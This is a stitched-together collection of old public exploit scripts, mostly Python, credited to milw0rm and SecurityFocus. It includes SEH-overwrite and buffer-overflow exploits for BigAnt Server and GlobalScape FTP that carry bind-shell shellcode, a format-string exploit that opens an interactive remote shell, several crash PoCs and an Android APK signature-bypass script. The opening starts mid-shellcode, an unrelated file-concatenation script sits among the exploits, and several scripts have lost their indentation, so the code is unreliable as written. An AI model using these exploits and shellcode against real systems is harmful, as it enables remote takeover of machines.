"\x4f\x4c\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x51\x30\x45\x51"
"\x4a\x4b\x50\x49\x4c\x4b\x47\x44\x4c\x4b\x45\x51\x4a\x4e\x50"
"\x31\x49\x50\x4a\x39\x4e\x4c\x4b\x34\x49\x50\x44\x34\x43\x37"
"\x49\x51\x49\x5a\x44\x4d\x45\x51\x48\x42\x4a\x4b\x4c\x34\x47"
"\x4b\x50\x54\x46\x44\x46\x48\x44\x35\x4b\x55\x4c\x4b\x51\x4f"
"\x46\x44\x43\x31\x4a\x4b\x43\x56\x4c\x4b\x44\x4c\x50\x4b\x4c"
"\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x44\x43\x46\x4c\x4c\x4b"
"\x4d\x59\x42\x4c\x47\x54\x45\x4c\x43\x51\x49\x53\x50\x31\x49"
"\x4b\x43\x54\x4c\x4b\x47\x33\x46\x50\x4c\x4b\x47\x30\x44\x4c"
"\x4c\x4b\x42\x50\x45\x4c\x4e\x4d\x4c\x4b\x47\x30\x43\x38\x51"
"\x4e\x45\x38\x4c\x4e\x50\x4e\x44\x4e\x4a\x4c\x46\x30\x4b\x4f"
"\x4e\x36\x45\x36\x46\x33\x43\x56\x45\x38\x47\x43\x46\x52\x42"
"\x48\x43\x47\x42\x53\x46\x52\x51\x4f\x50\x54\x4b\x4f\x48\x50"
"\x42\x48\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x46\x30\x4b\x4f\x48"
"\x56\x51\x4f\x4d\x59\x4b\x55\x45\x36\x4b\x31\x4a\x4d\x43\x38"
"\x45\x52\x46\x35\x43\x5a\x45\x52\x4b\x4f\x48\x50\x45\x38\x49"
"\x49\x44\x49\x4a\x55\x4e\x4d\x51\x47\x4b\x4f\x48\x56\x51\x43"
"\x51\x43\x51\x43\x51\x43\x46\x33\x51\x53\x50\x53\x47\x33\x51"
"\x43\x4b\x4f\x4e\x30\x42\x46\x43\x58\x42\x31\x51\x4c\x45\x36"
"\x46\x33\x4b\x39\x4d\x31\x4c\x55\x45\x38\x4e\x44\x44\x5a\x42"
"\x50\x49\x57\x50\x57\x4b\x4f\x49\x46\x42\x4a\x44\x50\x50\x51"
"\x50\x55\x4b\x4f\x48\x50\x45\x38\x49\x34\x4e\x4d\x46\x4e\x4a"
"\x49\x46\x37\x4b\x4f\x4e\x36\x50\x53\x46\x35\x4b\x4f\x48\x50"
"\x43\x58\x4b\x55\x47\x39\x4c\x46\x50\x49\x46\x37\x4b\x4f\x48"
"\x56\x46\x30\x50\x54\x50\x54\x46\x35\x4b\x4f\x4e\x30\x4c\x53"
"\x42\x48\x4b\x57\x44\x39\x48\x46\x44\x39\x50\x57\x4b\x4f\x48"
"\x56\x51\x45\x4b\x4f\x4e\x30\x42\x46\x43\x5a\x42\x44\x42\x46"
"\x43\x58\x43\x53\x42\x4d\x4c\x49\x4b\x55\x43\x5a\x46\x30\x51"
"\x49\x51\x39\x48\x4c\x4d\x59\x4d\x37\x42\x4a\x51\x54\x4b\x39"
"\x4a\x42\x50\x31\x49\x50\x4a\x53\x4e\x4a\x4b\x4e\x50\x42\x46"
"\x4d\x4b\x4e\x50\x42\x46\x4c\x4a\x33\x4c\x4d\x43\x4a\x47\x48"
"\x4e\x4b\x4e\x4b\x4e\x4b\x45\x38\x42\x52\x4b\x4e\x4e\x53\x42"
"\x36\x4b\x4f\x42\x55\x47\x34\x4b\x4f\x49\x46\x51\x4b\x50\x57"
"\x51\x42\x50\x51\x46\x31\x50\x51\x43\x5a\x43\x31\x50\x51\x50"
"\x51\x51\x45\x50\x51\x4b\x4f\x48\x50\x42\x48\x4e\x4d\x48\x59"
"\x45\x55\x48\x4e\x50\x53\x4b\x4f\x49\x46\x42\x4a\x4b\x4f\x4b"
"\x4f\x47\x47\x4b\x4f\x4e\x30\x4c\x4b\x51\x47\x4b\x4c\x4b\x33"
"\x48\x44\x45\x34\x4b\x4f\x49\x46\x50\x52\x4b\x4f\x4e\x30\x45"
"\x38\x4a\x50\x4d\x5a\x43\x34\x51\x4f\x51\x43\x4b\x4f\x4e\x36"
"\x4b\x4f\x4e\x30\x41\x41")


payload = "\x41" * 985		# seh overwritten at 989
next_seh = "\xeb\x06\x90\x90"   # short jump 6 bytes
seh = "\x6a\x19\x9a\x0f"	# p/p/r from vbajet32.dll
nops = "\x90" * 10		# nop sled
sc = shellcode			# 710 bytes available for shellcode

print "\n[*] BigAnt Server v2.50 SEH Overwrite 0day"
print "[*] Written and discovered by Blake"
print "[*] Tested on Windows XP SP3\n"

print "[+] Connecting to %s on port %d" % (host,port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((host,port))
except:
	print "[x] Error establishing connection\n"
	sys.exit(0)

print "[+] Sending payload"
s.send("GET " + payload + next_seh + seh + nops + sc + "\r\n\r\n")
s.close()
print "[+] Connect to bind shell on port 4444\n"

# milw0rm.com [2009-09-15]
#!/usr/bin/python
# by hack4love
# BigAnt Server version 2.50 SEH Overwrite Universal
# discovered by Blake http://www.milw0rm.com/exploits/9673
# Tested on Windows XP SP2
# gratez to Blake
# use >> bigant.py 192.168.1.12 6660


import socket, sys

if len(sys.argv)!= 3:
print "\n[*] Usage: %s <ip> <port>\n" % sys.argv[0]
sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2]) # port 6660 by default


shellcode = (
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x37\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x41"
"\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x51\x32\x42\x42\x32\x41"
"\x41\x30\x41\x41\x42\x58\x38\x42\x42\x50\x75\x4b\x59\x4b\x4c\x59"
"\x78\x52\x64\x63\x30\x65\x50\x53\x30\x4e\x6b\x57\x35\x77\x4c\x6c"
"\x4b\x61\x6c\x63\x35\x73\x48\x67\x71\x48\x6f\x6e\x6b\x50\x4f\x45"
"\x48\x6e\x6b\x53\x6f\x61\x30\x73\x31\x38\x6b\x53\x79\x4e\x6b\x66"
"\x54\x6e\x6b\x46\x61\x38\x6e\x30\x31\x6b\x70\x6e\x79\x6e\x4c\x4f"
"\x74\x79\x50\x74\x34\x44\x47\x4f\x31\x59\x5a\x76\x6d\x55\x51\x59"
"\x52\x68\x6b\x4a\x54\x35\x6b\x71\x44\x65\x74\x37\x74\x31\x65\x4a"
"\x45\x6e\x6b\x73\x6f\x44\x64\x55\x51\x4a\x4b\x50\x66\x4c\x4b\x44"
"\x4c\x30\x4b\x6e\x6b\x53\x6f\x37\x6c\x46\x61\x58\x6b\x6c\x4b\x77"
"\x6c\x6e\x6b\x46\x61\x5a\x4b\x4f\x79\x31\x4c\x47\x54\x37\x74\x6a"
"\x63\x74\x71\x59\x50\x70\x64\x6e\x6b\x51\x50\x50\x30\x6e\x65\x4b"
"\x70\x72\x58\x64\x4c\x6c\x4b\x71\x50\x56\x6c\x4e\x6b\x52\x50\x57"
"\x6c\x6c\x6d\x4c\x4b\x63\x58\x73\x38\x5a\x4b\x45\x59\x4e\x6b\x4f"
"\x70\x4c\x70\x35\x50\x43\x30\x63\x30\x4c\x4b\x53\x58\x77\x4c\x73"
"\x6f\x56\x51\x48\x76\x53\x50\x66\x36\x4f\x79\x39\x68\x6f\x73\x39"
"\x50\x61\x6b\x30\x50\x61\x78\x4a\x50\x6c\x4a\x73\x34\x33\x6f\x45"
"\x38\x6d\x48\x49\x6e\x6c\x4a\x46\x6e\x76\x37\x69\x6f\x48\x67\x45"
"\x33\x73\x51\x72\x4c\x71\x73\x63\x30\x41")


payload = "\x41" * 985
next_seh = "\xeb\x06\x90\x90"
seh = "\xc3\x20\xc4\x6b" #MFC42.DLL
nops = "\x90" * 10
sec = shellcode

print "[+] Connecting to %s on port %d" % (host,port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
s.connect((host,port))
except:
print "[x] Error establishing connection\n"
sys.exit(0)

print "[+] Sending payload"
s.send("GET " + payload + next_seh + seh + nops + sec + "\r\n\r\n")
s.close()

# milw0rm.com [2009-09-15]
#!/usr/bin/python
###############################################
# GlobalScape Secure FTP Server Buffer Overflow
# Coded by mati@see-security.com
# http://www.see-security.com
# http://www.hackingdefined.com/exploits/Globalscape30.pdf
###############################################
# EIP Overwrite
# root@[muts]# ./globalscape-3.0-ftp.py
#
# [+] Evil GlobalFTP 3.0 Secure Server Exploit
# [+] Coded by mati [at] see-security [dot] com
# [+] 220 GlobalSCAPE Secure FTP Server (v. 3.0) * UNREGISTERED COPY *
#
# [+] Sending Username
# [+] Sending Password
# [+] Sending evil buffer
# [+] Connect to port 4444 on victim Machine!
#
# root@[muts]# nc -v 192.168.1.153 4444
# [192.168.1.153] 4444 (?) open
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-2000 Microsoft Corp.
#
# C:\WINNT\system32>

import socket
import struct
import time

# win32_bind - EXITFUNC=thread LPORT=4444 Size=717 Encoder=PexAlphaNum 
# http://metasploit.com */

sc = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
sc +="\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
sc +="\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
sc +="\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
sc +="\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
sc +="\x4f\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x58"
sc +="\x4e\x56\x46\x32\x46\x32\x4b\x38\x45\x44\x4e\x43\x4b\x58\x4e\x47"
sc +="\x45\x50\x4a\x57\x41\x50\x4f\x4e\x4b\x38\x4f\x34\x4a\x41\x4b\x58"
sc +="\x4f\x55\x42\x52\x41\x30\x4b\x4e\x43\x4e\x42\x53\x49\x54\x4b\x38"
sc +="\x46\x53\x4b\x58\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a"
sc +="\x46\x58\x42\x4c\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x30"
sc +="\x44\x4c\x4b\x4e\x46\x4f\x4b\x33\x46\x55\x46\x42\x4a\x42\x45\x57"
sc +="\x43\x4e\x4b\x58\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x58"
sc +="\x4e\x50\x4b\x34\x4b\x48\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x43\x30"
sc +="\x4e\x52\x4b\x48\x49\x38\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c"
sc +="\x41\x43\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x33\x4b\x58\x42\x44"
sc +="\x4e\x50\x4b\x38\x42\x47\x4e\x41\x4d\x4a\x4b\x48\x42\x54\x4a\x50"
sc +="\x50\x35\x4a\x46\x50\x58\x50\x44\x50\x50\x4e\x4e\x42\x35\x4f\x4f"
sc +="\x48\x4d\x41\x53\x4b\x4d\x48\x36\x43\x55\x48\x56\x4a\x36\x43\x33"
sc +="\x44\x33\x4a\x56\x47\x47\x43\x47\x44\x33\x4f\x55\x46\x55\x4f\x4f"
sc +="\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e\x4e\x4f\x4b\x53\x42\x45\x4f\x4f"
sc +="\x48\x4d\x4f\x35\x49\x48\x45\x4e\x48\x56\x41\x48\x4d\x4e\x4a\x50"
sc +="\x44\x30\x45\x55\x4c\x46\x44\x50\x4f\x4f\x42\x4d\x4a\x36\x49\x4d"
sc +="\x49\x50\x45\x4f\x4d\x4a\x47\x55\x4f\x4f\x48\x4d\x43\x45\x43\x45"
sc +="\x43\x55\x43\x55\x43\x45\x43\x34\x43\x45\x43\x34\x43\x35\x4f\x4f"
sc +="\x42\x4d\x48\x56\x4a\x56\x41\x41\x4e\x35\x48\x36\x43\x35\x49\x38"
sc +="\x41\x4e\x45\x49\x4a\x46\x46\x4a\x4c\x51\x42\x57\x47\x4c\x47\x55"
sc +="\x4f\x4f\x48\x4d\x4c\x36\x42\x31\x41\x45\x45\x35\x4f\x4f\x42\x4d"
sc +="\x4a\x36\x46\x4a\x4d\x4a\x50\x42\x49\x4e\x47\x55\x4f\x4f\x48\x4d"
sc +="\x43\x35\x45\x35\x4f\x4f\x42\x4d\x4a\x36\x45\x4e\x49\x44\x48\x38"
sc +="\x49\x54\x47\x55\x4f\x4f\x48\x4d\x42\x55\x46\x35\x46\x45\x45\x35"
sc +="\x4f\x4f\x42\x4d\x43\x49\x4a\x56\x47\x4e\x49\x37\x48\x4c\x49\x37"
sc +="\x47\x45\x4f\x4f\x48\x4d\x45\x55\x4f\x4f\x42\x4d\x48\x36\x4c\x56"
sc +="\x46\x46\x48\x36\x4a\x46\x43\x56\x4d\x56\x49\x38\x45\x4e\x4c\x56"
sc +="\x42\x55\x49\x55\x49\x52\x4e\x4c\x49\x48\x47\x4e\x4c\x36\x46\x54"
sc +="\x49\x58\x44\x4e\x41\x43\x42\x4c\x43\x4f\x4c\x4a\x50\x4f\x44\x54"
sc +="\x4d\x32\x50\x4f\x44\x54\x4e\x52\x43\x49\x4d\x58\x4c\x47\x4a\x53"
sc +="\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x46\x44\x57\x50\x4f\x43\x4b\x48\x51"
sc +="\x4f\x4f\x45\x57\x46\x54\x4f\x4f\x48\x4d\x4b\x45\x47\x35\x44\x35"
sc +="\x41\x35\x41\x55\x41\x35\x4c\x46\x41\x50\x41\x35\x41\x45\x45\x35"
sc +="\x41\x45\x4f\x4f\x42\x4d\x4a\x56\x4d\x4a\x49\x4d\x45\x30\x50\x4c"
sc +="\x43\x35\x4f\x4f\x48\x4d\x4c\x56\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f"
sc +="\x42\x4d\x4b\x58\x47\x45\x4e\x4f\x43\x38\x46\x4c\x46\x36\x4f\x4f"
sc +="\x48\x4d\x44\x55\x4f\x4f\x42\x4d\x4a\x36\x4f\x4e\x50\x4c\x42\x4e"
sc +="\x42\x36\x43\x55\x4f\x4f\x48\x4d\x4f\x4f\x42\x4d\x5a"

buffer = '\x41'*2043+ struct.pack("<L",0x7C4FEDBB)+'\x90'*36+sc
try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "\n[+] Evil GlobalFTP 3.0 Secure Server Exploit"
	print "[+] Coded by muts"
	connect=s.connect(('192.168.1.153',21))
	d=s.recv(1024)
	print "[+] " +d
	print "[+] Sending Username"
	time.sleep(1)
	s.send('USER muts\r\n')
	s.recv(1024)
	print "[+] Sending Password"
	time.sleep(1)
	s.send('PASS muts\r\n')
	s.recv(1024)
	print "[+] Sending evil buffer"
	time.sleep(1)
	s.send(buffer+'r\n')
	print "[+] Connect to port 4444 on victim Machine!\n"
except:
	print "Can't connect to ftp"

# milw0rm.com [2005-05-01]
#!/usr/bin/env python

####################################################################################
#
# CDBurnerXP v 4.2.4.1351 Local Crash PoC
# Found By:	Dr_IDE
# Tested On:	XPSP3, 7RC
# Usage:	Create New Data Disc, Add a Folder, Paste to Rename Folder, Click Save Compilation as ISO
# Notes:	Super lame and most likely not exploitable.
#
####################################################################################

'''
Error Message:
System.NullReferenceException: Object reference not set to an instance of an object.
   at CDBurnerXP.Controls.FileLayoutManager.SaveAsIso(String filename)
   at CDBurnerXP_Pro.frmDataCompilation.mnuSaveISO_Click(Object sender, EventArgs e)
   at System.Windows.Forms.MenuItem.OnClick(EventArgs e)
   at System.Windows.Forms.MenuItem.MenuItemData.Execute()
   at System.Windows.Forms.Command.Invoke()
   at System.Windows.Forms.Command.DispatchID(Int32 id)
   at System.Windows.Forms.Control.WmCommand(Message& m)
   at System.Windows.Forms.Control.WndProc(Message& m)
   at System.Windows.Forms.ScrollableControl.WndProc(Message& m)
   at System.Windows.Forms.ContainerControl.WndProc(Message& m)
   at System.Windows.Forms.Form.WndProc(Message& m)
   at CDBurnerXP.Forms.BaseForm.WndProc(Message& m)
   at CDBurnerXP_Pro.mdiMain.WndProc(Message& m)
   at System.Windows.Forms.Control.ControlNativeWindow.OnMessage(Message& m)
   at System.Windows.Forms.Control.ControlNativeWindow.WndProc(Message& m)
   at System.Windows.Forms.NativeWindow.Callback(IntPtr hWnd, Int32 msg, IntPtr wparam, IntPtr lparam)
'''

buff = ("\x41" * 5000)

f1 = open("cdburnerxp.txt","w")
f1.write(buff)
f1.close()

#!/usr/bin/env python

####################################################################################
#
# Core FTP LE v2.1 build 1612 Local Buffer Overflow PoC (Unicode)
# Found By:	Dr_IDE
# Tested On:	XPSP3, 7RC
# Notes:	Most likely other versions are vulnerable too.
# Usage:	File, Quick Connect, Paste into Hostname, Connect
#
####################################################################################

# Register Dump on XPSP3
"""
EAX 00000064
ECX 00410041 coreftp.00410041
EDX 0054F840 coreftp.0054F840
EBX 026E2FFC
ESP 0321E958 UNICODE "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
EBP 00410041 coreftp.00410041
ESI 0269CC30
EDI 04BB6A58 UNICODE "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
EIP 00410041 coreftp.00410041
C 0  ES 002B 32bit 0(FFFFFFFF)
P 0  CS 0023 32bit 0(FFFFFFFF)
A 0  SS 002B 32bit 0(FFFFFFFF)
Z 0  DS 002B 32bit 0(FFFFFFFF)
S 0  FS 0053 32bit 7EFD7000(FFF)
T 0  GS 002B 32bit 0(FFFFFFFF)
D 0
O 0  LastErr WSAHOST_NOT_FOUND (00002AF9)
EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G)
ST0 empty 0.0
ST1 empty 0.0
ST2 empty 0.0
ST3 empty 0.0
ST4 empty 0.0
ST5 empty 0.0
ST6 empty 0.0
ST7 empty 0.0
               3 2 1 0      E S P U O Z D I
FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
"""

# After Passing Exception on XPSP3
# EIP 00410041 coreftp.00410041

buff = ("\x41" * 6000)

f1 = open("coreftple.txt","w")
f1.write(buff)
f1.close()
##########################################################################################################
#
# VLC Media Player 1.0.2 smb:// URI Handling Remote Stack Overflow PoC
# Found By:	Dr_IDE
# Tested:	Windows XP SP2 , XP SP3 and Windows 7 RC1 with VLC 1.0.2 "Goldeneye"
# Download:	http://majorgeeks.com/downloadget.php?id=4674&file=1&evp=a87d1b50269ba27878899d30ec7cd947
#
##########################################################################################################

# XPSP3 Crash 
"""
EAX FFFFFFFE
ECX 42424242        <--------- w00t!
EDX 00000000
EBX 42424242
ESP 02EAF694
EBP 02EAF7C4
ESI 61CC8324 libacc_4.61CC8324
EDI 61CC8323 libacc_4.61CC8323
EIP 77C478AC msvcrt.77C478AC
C 0  ES 0023 32bit 0(FFFFFFFF)
P 0  CS 001B 32bit 0(FFFFFFFF)
A 0  SS 0023 32bit 0(FFFFFFFF)
Z 0  DS 0023 32bit 0(FFFFFFFF)
S 0  FS 003B 32bit 7FFAC000(FFF)
T 0  GS 0000 NULL
D 0
O 0  LastErr ERROR_MOD_NOT_FOUND (0000007E)
EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G)
ST0 empty -UNORM FB18 0184A1C0 00AD4518
ST1 empty +UNORM 2088 00000000 00000000
ST2 empty 0.3987488760738806780e-4933
ST3 empty -??? FFFF 00000000 77C2C42E
ST4 empty +UNORM 0B10 00B094E8 00000000
ST5 empty 0.3987486256431287370e-4933
ST6 empty 0.0
ST7 empty -0.2650710894356302916
               3 2 1 0      E S P U O Z D I
FST 0020  Cond 0 0 0 0  Err 0 0 1 0 0 0 0 0  (GT)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1

"""
header1 =  ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
header1 += ("<playlist version=\"1\" xmlns=\"http://xspf.org/ns/0/\" xmlns:vlc=\"http://www.videolan.org/vlc/playlist/ns/0/\">\n")
header1 += ("\t<title>Playlist</title>\n")
header1 += ("\t<trackList>\n")
header1 += ("\t\t<track>\n")
header1 += ("\t\t\t<location>smb://example.com@www.example.com/foo/#{")

payload = ("\x41" * 2 + "\x42" * 4 + "\x43" * 10000)

header2 =  ("}</location>\n");
header2 += ("\t\t\t<extension application=\"http://www.videolan.org/vlc/playlist/0\">\n");
header2 += ("\t\t\t\t<vlc:id>0</vlc:id>\n");
header2 += ("\t\t\t</extension>\n");
header2 += ("\t\t</track>\n");
header2 += ("\t</trackList>\n");
header2 += ("</playlist>\n");

try:
    f1 = open("vlc_1.0.2.xspf","w")
    f1.write(header1 + payload + header2)
    f1.close()
    print("\nExploit file created!\n")
except:
    print "Error"
#!/usr/bin/env python

#####################################################################################################
#
# CuteFTP v8.3.3 Home/Pro/Lite Create New Site Local Buffer Overflow PoC
# Found By:	Dr_IDE
# Download: 	http://www.cuteftp.com/downloads/
# Tested On:	Windows 7 RC, XP might be more shell friendly
# Notes: 	This PoC exploits the "Create New Site" mechanism. Any site type that you pick will work.
# 		Because of differences in the internal process of each site type you may be able to get
#		execution through one of these channels.
#
#####################################################################################################

"""
EAX 02120000
ECX 0228BA90 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
EDX 41414141
EBX 00004141
ESP 0018C160
EBP 0018C230
ESI 0228BA88
EDI 41414141
EIP 77843913 ntdll.77843913
C 0  ES 002B 32bit 0(FFFFFFFF)
P 0  CS 0023 32bit 0(FFFFFFFF)
A 1  SS 002B 32bit 0(FFFFFFFF)
Z 0  DS 002B 32bit 0(FFFFFFFF)
S 0  FS 0053 32bit 7EFDD000(FFF)
T 0  GS 002B 32bit 0(FFFFFFFF)
D 0
O 0  LastErr ERROR_SUCCESS (00000000)
EFL 00010212 (NO,NB,NE,A,NS,PO,GE,G)
ST0 empty -??? FFFF 000000FF 00FF00FF
ST1 empty -??? FFFF 00000000 00008200
ST2 empty -??? FFFF 00010000 00010000
ST3 empty 431.99999034404754640
ST4 empty 1.0000000000000000000
ST5 empty 1.0000000000000000000
ST6 empty 16.000000000000000000
ST7 empty 16.000000000000000000
               3 2 1 0      E S P U O Z D I
FST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1

"""

buff = ("\x41" * 20000)

try:
	f1 = open("CuteFTP.txt","w");
	f1.write(buff);
	f1.close();

	print "\nCuteFTP v8.3.2 Home/Pro/Lite Create New Site Local Buffer Overflow PoC"
	print "By: Dr_IDE"
	print "\nFile Created Successfully.\n"
	print "Usage:\n [-] Click File\n [-] Create New FTP Site\n [-] Paste String into Label Field\n [-] Enter anything for Address\n [-] Click Connect\n [-] Boom."
except:
	print "[-] Error. File couldn't be created."
import glob, shutil

with open("concatenatedPython", 'wb') as outfile:
    for filename in glob.glob('*.py'):
        if filename == "concatenatedPython":
            # don't want to copy the output into the output
            continue
        with open(filename, 'rb') as readfile:
            shutil.copyfileobj(readfile, outfile)
# by jaguar
#!/usr/bin/python
import os, sys, socket, struct, time, telnetlib

class rlprd:
fd = None
pad = 2 

#00000000  31DB              xor ebx,ebx
#00000002  F7E3              mul ebx
#00000004  B003              mov al,0x3
#00000006  80C304            add bl,0x4
#00000009  89E1              mov ecx,esp
#0000000B  4A                dec edx
#0000000C  CC                int3
#0000000D  CD80              int 0x80
#0000000F  FFE1              jmp ecx

# read(4, esp, -1); jmp ecx
lnx_readsc = "\x31\xdb\xf7\xe3\xb0\x03\x80\xc3\x04\x89\xe1\x4a\xcd\x80\xff\xe1"
lnx_stage_one = "\x90" * (23 - len(lnx_readsc)) + lnx_readsc
# dup2 shellcode(4->0,1,2)
lnx_stage_two  = "\x31\xc0\x89\xc3\x89\xc1\x89\xc2\xb2\x3f\x88\xd0\xb3\x04" 
lnx_stage_two += "\xcd\x80\x89\xd0\x41\xcd\x80\x89\xd0\x41\xcd\x80"
# execute /bin/sh 
lnx_stage_two += "\x90" * 100
lnx_stage_two += "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68"
lnx_stage_two += "\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
lnx_stage_two += "\xe1\x8d\x42\x0b\xcd\x80"

targets = [ [ 0 ], [ "Compiled test platform", 0x0804c418, 0xbffff9e8 ] ] 

bruteforce = 0

def __init__(self, host, os, target, port=7290):
self.host = host
self.port = port

set = 0
if(os == "linux"):
set = 1
self.stage_one = self.lnx_stage_one
self.stage_two = self.lnx_stage_two

if(set == 0):
print "Unknown OS"
os._exit()

self.os = os

if(target == 0):
self.bruteforce = 1
else: 
self.args = self.targets[target]

def wl16(self, write_byte):
write_byte += 0x10000
self.already_written %= 0x10000
padding = (write_byte - self.already_written) % 0x10000
if(padding < 10):
padding += 0x10000

self.already_written += padding

return padding

def connect(self):
#if self.fd is not None:
# self.fd.close()
# self.fd = None

self.fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
self.fd.connect((self.host, self.port))

def exploit(self, where, what):
if(not self.fd or self.fd is None): self.connect()
self.already_written = len('gethostbyname(')

#print "# of nops: %d\n" % (23 - len(self.readsc))

exploit = "x" * self.pad
self.already_written += self.pad

exploit += struct.pack("<l", where)
exploit += struct.pack("<l", where + 2)
self.already_written += 8 

l = self.wl16(what & 0xffff)
fill = "%1$" + str(l) + "u"
exploit += fill

exploit += "%7$hn"

l = self.wl16(what >> 16)
fill = "%1$" + str(l) + "u"
exploit += fill

exploit += "%8$hn"

#print "[*] Format string: (%s) Len: %d" % (exploit, len(exploit))
#print "[*] Stage 1 length: %d" % len(self.stage_one)

#time.sleep(5)
try:
self.fd.send(exploit + self.stage_one + "\n")
self.fd.send(self.stage_two)
time.sleep(1)
self.fd.send("echo spawned; uname -a; id -a;\n")
print "Recieved: " + self.fd.recv(1024)
except:
self.fd.close()
self.fd = None 
print "\tFailed @ 0x%08x" % what
return 0

remote = telnetlib.Telnet()
remote.sock = self.fd
print "[*] You should now have a shell"
remote.interact()
os.exit(0)

def force(self, where, high, lo):
for i in range(high, lo, -8):
r.exploit(where, i)

def run(self):
if(self.bruteforce):
print "Bruteforcing.."
#print "not implemented yet"
#os._exit(1)
for i in range(0x0804c000, 0x0804d000, 0x100 / 6):
print "Trying: 0x%08x" % i
self.force(i, 0xbffffa00, 0xbffff9c0)

#self.exploit(self.args[1], self.args[2])

if __name__ == '__main__':
if(len(sys.argv) != 4):
print "%s host [linux] targetid"
print "- 0 to brute force"
print "- 1 custom compile"
os._exit(0)

print "%s-%s-%s" % (sys.argv[1], sys.argv[2], sys.argv[3])
r = rlprd(sys.argv[1], sys.argv[2], int(sys.argv[3]))
#r.exploit(0x0804c418, 0xbffff9e8)
#r.force(0x0804c418, 0xbffffa00, 0xbffff800)
r.run()


# milw0rm.com [2004-06-25]
source: http://www.securityfocus.com/bid/63547/info

Google Android is prone to a security-bypass vulnerability.

Attackers can exploit this issue to bypass certain security restrictions to perform unauthorized actions. This may aid in further attacks.

Android 4.4 is vulnerable; other versions may also be affected. 

#!/usr/bin/python

import zipfile
import struct
import sys

# usage: ./pocB.py new.apk old.apk file data
zout = zipfile.ZipFile(sys.argv[1], "w")
zin = zipfile.ZipFile(sys.argv[2], "r")
replace = sys.argv[3]
new = open(sys.argv[4], 'r').read()

fp = zout.fp

for name in zin.namelist():
    old = zin.read(name)
    if name != replace:
        zout.writestr(name, old, zipfile.ZIP_DEFLATED)
    else:
        assert len(new) <= len(old)

        # write header, old data, and record offset
        zout.writestr(name, old, zipfile.ZIP_STORED)
        offset = fp.tell()

        # return to name length, set to skip old data
        fp.seek(-len(old) -len(name) -4, 1)
        fp.write(struct.pack('<h', len(name) + len(old)))

        # after old data, write new data \0 padded
        fp.seek(offset)
        fp.write(new)
        fp.write('\0' * (len(old) - len(new)))

zout.close()
zin.close()
source: http://www.securityfocus.com/bid/63743/info

Linux Kernel is prone to an information-disclosure vulnerability.

An attacker can exploit this issue to obtain sensitive information like original MAC address; information obtained may aid in other attacks.

Note: This BID was previously titled 'Atheros Wireless Drivers MAC Address Information Disclosure Vulnerability'. The title and technical details have been changed to better reflect the underlying component affected. 

#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import random

# number of times to inject probe for one bit (combat packet loss)
ATTEMPTS_PER_BIT = 6
# time to wait for ACK in seconds
SNIFFTIME = 0.3


def randmac():
	mac = [0] * 6
	for i in xrange(6):
		mac[i] = random.randint(0, 256)

	# avoid multicast/broadcast mac
	mac[0] = mac[0] & 0xFE

	return ":".join([format(byte, '02x') for byte in mac])


def parsemac(macstr):
	parts = macstr.replace("-", ":").split(":")
	if len(parts) != 6:
		raise ValueError("MAC does not consist of 6 parts (separated by : or -)")

	return [int(byte, 16) for byte in parts]


def is_ack(p):
	return Dot11 in p and p.type == 1 and p.subtype == 13


